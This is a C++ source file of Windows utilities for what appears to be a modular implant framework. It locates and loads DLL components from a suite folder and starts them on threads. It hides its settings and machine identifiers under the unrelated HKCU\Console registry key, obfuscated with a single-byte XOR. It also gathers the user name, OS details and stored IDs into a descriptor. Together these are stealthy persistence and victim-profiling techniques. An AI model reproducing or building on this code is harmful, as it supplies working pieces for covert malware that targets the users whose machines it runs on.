#include "ComponentUtilities.h"
#include <string>
#include <shlwapi.h>
#include <filesystem>
#include <process.h>


typedef  DWORD(__cdecl* Func_Prototype)(void);		//DO NOT USE FOR CreateThread or _beginthreadex
typedef  unsigned int(__stdcall* Begin_Func_prototype)(void*);

//Used only by components to simply take their lock
FILE_MUTEX_STRUCT getComponentLock(HMODULE dllInstance) {
	char loader_cstr_path[2048];
	std::string current_loader_filename;
	HANDLE componentHandle;

	if (GetModuleFileNameA(dllInstance, loader_cstr_path, sizeof(loader_cstr_path)) == NULL) return { false };
	current_loader_filename = std::string(PathFindFileNameA(loader_cstr_path));

	std::string mutexPath = std::string("COM_") + current_loader_filename;

	if ((componentHandle = CreateMutexA(NULL, true, mutexPath.c_str())) == NULL) {
		return { false };
	}

	DWORD waitRes = WaitForSingleObject(componentHandle, 20);

	if (waitRes == WAIT_OBJECT_0 || waitRes == WAIT_ABANDONED) {
		return { true, componentHandle, std::string(loader_cstr_path) };
	} else {
		CloseHandle(componentHandle);
		return { false };
	}
}

std::string guidToString(GUID guid) {
	char output[100];
	snprintf(output, 50, "{%08X-%04hX-%04hX-%02X%02X-%02X%02X%02X%02X%02X%02X}", guid.Data1, guid.Data2, guid.Data3, guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3], guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);
	return std::string(output);
}

//Windows version
BOOL is64BitWindows() {
#if defined(_WIN64)
	return TRUE;  // 64-bit programs run only on Win64
#elif defined(_WIN32)
	// 32-bit programs run on both 32-bit and 64-bit Windows
	// so must sniff
	BOOL f64 = FALSE;
	return IsWow64Process(GetCurrentProcess(), &f64) && f64;
#else
	return FALSE; // Win64 does not support Win16
#endif
}


std::string getRegistryParam(std::string name) {
	char* data = new char[65000];
	DWORD size = 64000;

	if (name.size() == 0) return std::string("");

	if (RegGetValueA(HKEY_CURRENT_USER, "Console", name.c_str(), RRF_RT_REG_BINARY, NULL, data, &size) != ERROR_SUCCESS) return std::string("");

	for (int i = 0; i < size; i++) {
		data[i] ^= 0x72;
	}
	data[size] = 0;

	std::string res = std::string(data);
	delete[] data;
	return res;
}
void setRegistryParam(std::string name, std::string value) {
	char* data = new char[65000];
	DWORD size = min(64000, value.size());//Do not include terminating 0

	if (name.size() == 0) return;
	if (value.size() == 0) return;

	strncpy_s(data, 65000, value.c_str(), size);
	for (int i = 0; i < size; i++) {
		data[i] ^= 0x72;
	}

	RegSetKeyValueA(HKEY_CURRENT_USER, "Console", name.c_str(), REG_BINARY, data, size);
	delete[] data;
}
//Returns the path where dlls(with backslash) for this compiled dll arhitecture(32/64) are. Otherwise empty string.
std::string getSuitePath() {
#ifdef _WIN64
	const char* reg_value = "SIO64";
#else
	const char* reg_value = "SIO32";
#endif

	char data[1024];
	DWORD size = 1022;	//leave space for the blackslash

	if (RegGetValueA(HKEY_CURRENT_USER, "Console", reg_value, RRF_RT_REG_SZ, NULL, data, &size) != ERROR_SUCCESS) return std::string("");

	if (data[size - 2] != '\\') {
		data[size - 1] = '\\';
		data[size] = 0;
	}
	return std::string(data);
}


FILE_MUTEX_STRUCT lockFile(std::string filename) {
	FILE_MUTEX_STRUCT res;

	HANDLE loaderHandle, componentHandle;

	//The module name is independent from 32/64
	if ((loaderHandle = CreateMutexA(NULL, true, (std::string("LOADER_") + filename).c_str())) == NULL) {
		return { false };
	}
	if ((componentHandle = CreateMutexA(NULL, true, (std::string("COM_") + filename).c_str())) == NULL) {
		CloseHandle(loaderHandle);
		return { false };
	}

	//We have the handle...now take control over it (CreateMutex almost ALWAYS returns a handle..it doesn't care for the owner) but WaitFor.. does care.
	DWORD waitloaderRes = WaitForSingleObject(loaderHandle, 20);

	if (waitloaderRes == WAIT_OBJECT_0 || waitloaderRes == WAIT_ABANDONED) {

		//Check to see if the component is already loaded
		DWORD waitcompRes = WaitForSingleObject(componentHandle, 20);

		if (waitcompRes == WAIT_OBJECT_0 || waitcompRes == WAIT_ABANDONED) {
			//Just checking the component mutex. We don't need it.
			ReleaseMutex(componentHandle);
			CloseHandle(componentHandle);

			//Do not add the file name. The function that called this will add it.
			res.loaderHandle = loaderHandle;
			res.locked = true;

			return res;
		}

		ReleaseMutex(loaderHandle);
	}

	CloseHandle(loaderHandle);
	CloseHandle(componentHandle);

	return { false };
}

//Gets the next available dll with corresponding type to load
//Specify ClientTypes::any_load to load the next component
FILE_MUTEX_STRUCT getNextLibComponent(ClientTypes type) {
	std::string path = getSuitePath();

	if (!std::filesystem::exists(path)) return { false };

	for (const auto& entry : std::filesystem::directory_iterator(path)) {
		FILE_MUTEX_STRUCT lock;

		if (!entry.path().has_filename() || !entry.path().has_extension()) continue;

		std::string file_path = entry.path().generic_u8string();
		std::string filename = entry.path().filename().generic_u8string();

		//Do not load  *_old.dll files or non-dll files
		if (filename.find("_old") != std::string::npos || filename.find("loader") != std::string::npos || filename.find(".dll") == std::string::npos) continue;

		if ((lock = lockFile(filename)).locked) {
			//Check the type
			HMODULE component = LoadLibraryA(file_path.c_str());

			if (component == NULL) {
				ReleaseMutex(lock.loaderHandle);
				CloseHandle(lock.loaderHandle);

				continue;
			}

			Func_Prototype getTypeFunc = (Func_Prototype)GetProcAddress(component, "getType");

			if (getTypeFunc == NULL) {
				ReleaseMutex(lock.loaderHandle);
				CloseHandle(lock.loaderHandle);
				FreeLibrary(component);

				continue;
			}

			//Do not load loader.dll
			if ((ClientTypes)getTypeFunc() == ClientTypes::no_load) {
				ReleaseMutex(lock.loaderHandle);
				CloseHandle(lock.loaderHandle);
				FreeLibrary(component);

				continue;
			}

			// Only load the specified component
			if (type != ClientTypes::any_load && getTypeFunc() != (DWORD)type) {
				ReleaseMutex(lock.loaderHandle);
				CloseHandle(lock.loaderHandle);
				FreeLibrary(component);

				continue;
			}

			FreeLibrary(component);

			lock.file_path = file_path;
			return lock;
		}
	}

	return { false };
}
//Loads and manages resource of the provided component
//Releases provided mutex and closes handle
void initiateComponent(FILE_MUTEX_STRUCT lib_file) {
	//TODO: move all the component initiating code here. It is used in at least three places: loader,HorizonClient and loader:debug() function

	if (!lib_file.locked) return;
	DBG((std::string("Loading following component:") + lib_file.file_path).c_str());

	HMODULE lib = LoadLibraryA(lib_file.file_path.c_str());
	if (lib != NULL) {
		Begin_Func_prototype IntroFunc = (Begin_Func_prototype)GetProcAddress(lib, "coInitComponent");

		if (IntroFunc != NULL) {
			//The intro function will create a mutex

			HANDLE thread;
			if ((thread = (HANDLE)_beginthreadex(NULL, 0, IntroFunc, 0, 0, NULL)) == NULL) {
				DBG("Error creating thread");
				FreeLibrary(lib);
			} else {
				//Wait a little for the component lock to be taken
				//Use Wait because if the thread closes this will reurn much faster than then the timeout. 
				//If the thread continues it will block the normal amount of time.
				WaitForSingleObject(thread, 300);
			}

			//if ((thread = CreateThread(0, 0, IntroFunc, 0, 0, 0)) == NULL) {
			//	DBG("Error creating thread");
			//	FreeLibrary(lib);
			//} else {
			//	//Wait a little for the component lock to be taken
			//	//Use Wait because if the thread closes this will reurn much faster than then the timeout. 
			//	//If the thread continues it will block the normal amount of time.
			//	WaitForSingleObject(thread, 300);
			//}
		} else {
			DBG("Error creating thread");
			FreeLibrary(lib);
		}

	}

	ReleaseMutex(lib_file.loaderHandle);
	CloseHandle(lib_file.loaderHandle);
}


void updateStoredDescriptor(const USERDESCRIPTOR* user) {
	setRegistryParam("uid", std::string(user->unique_id));
	setRegistryParam("pc", std::string(user->pc_description));
	setRegistryParam("cu", std::string(user->custom_name));
	setRegistryParam("ex", std::string(user->extra_data));
}
std::unique_ptr<USERDESCRIPTOR> loadStoredDescriptor(int version, ClientTypes component_type) {
	std::unique_ptr<USERDESCRIPTOR> result(new USERDESCRIPTOR);

	ZeroMemory(result.get(), sizeof(USERDESCRIPTOR));

	DWORD username_len = sizeof(result->user_name);
	strcpy_s(result->user_name, "OVERFLOW");
	GetUserNameA(result->user_name, &username_len);

	result->version = version;
	result->os_version = (is64BitWindows() ? 64 : 32);
	result->client_type = (uint32_t)component_type;

	GetSystemTime(&(result->os_time));

	strncpy_s(result->unique_id, getRegistryParam("uid").c_str(), _TRUNCATE);
	strncpy_s(result->pc_description, getRegistryParam("pc").c_str(), _TRUNCATE);
	strncpy_s(result->custom_name, getRegistryParam("cu").c_str(), _TRUNCATE);
	strncpy_s(result->extra_data, getRegistryParam("ex").c_str(), _TRUNCATE);

	// Make sure all null terminators are appended
	sanitizeUserDescriptor(result.get());

	return result;
}
